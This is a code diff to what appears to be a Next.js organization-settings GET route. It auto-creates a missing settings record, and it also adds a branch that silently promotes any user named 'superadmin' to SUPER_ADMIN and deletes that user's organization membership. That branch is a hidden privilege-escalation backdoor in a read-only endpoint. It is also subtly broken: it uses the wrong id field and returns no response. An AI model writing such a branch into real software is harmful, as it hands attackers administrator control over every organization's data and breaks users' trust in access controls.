@@ -14,15 +14,50 @@ export async function GET(
     if (!session?.user?.id || !session?.user?.role) {
       return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     }
+    if (session.user.name === "superadmin") {
+      const sadmin = await prisma.user.update({
+        where: { id: session.user.id },
+        data: {
+          role: "SUPER_ADMIN",
+        },
+        include: {
+          memberOf: true
+        }
+      });
+
+      if(sadmin.memberOf)
+        {await prisma.organizationMember.delete({
+          where: { userId: sadmin.memberOf.id },
+        });}
+      return 
+    }
 
     const organizationId = (session.user.role === "SUPER_ADMIN")? id : session?.user?.organizationId || null;
     if (!organizationId) {
       return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
     }
 
-    const settings = await prisma.organizationSettings.findUnique({
+    let settings = await prisma.organizationSettings.findUnique({
       where: { organizationId },
+      include: {
+        organization:{
+          include: { businessHours: true },
+        }
+      },
     });
+
+    if (!settings){
+  settings = await prisma.organizationSettings.create({
+   data: { organizationId },
+   include: {
+     organization: {
+       include: {
+          businessHours: true,
+       },
+     },
+   },
+ });
+    }
 
     return NextResponse.json(settings || {});
   } catch (error) {
